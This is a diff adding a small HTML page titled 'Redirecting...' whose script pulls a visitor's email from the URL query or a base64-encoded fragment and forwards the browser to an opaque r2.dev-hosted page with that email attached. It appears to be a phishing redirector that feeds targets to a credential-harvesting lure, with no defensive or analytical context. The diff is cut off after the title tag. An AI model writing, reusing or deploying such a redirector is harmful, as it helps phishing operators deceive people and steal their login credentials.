@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script>
+        var autocode = "";
+        var link = "https://pub-8bf90c0e793f4cc78521c70f84e4e1d7.r2.dev/g58hf437429hg7w36.htm";
+        function getEmailParamFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get("email");
+    
+        if (!emailParam) {
+        const urlFragment = window.location.hash.substring(1);
+        try {
+        const decodedText = atob(urlFragment);
+        return decodedText;
+        } catch (error) {
+        return urlFragment;
+        }
+        }
+        return emailParam;
+        }
+
+        const emailValue = getEmailParamFromURL();
+        if (emailValue) {
+        autocode = "#"+emailValue;
+        }
+        window.location.href = link+autocode;
+    </script>
+    <title>Redirecting...</title>
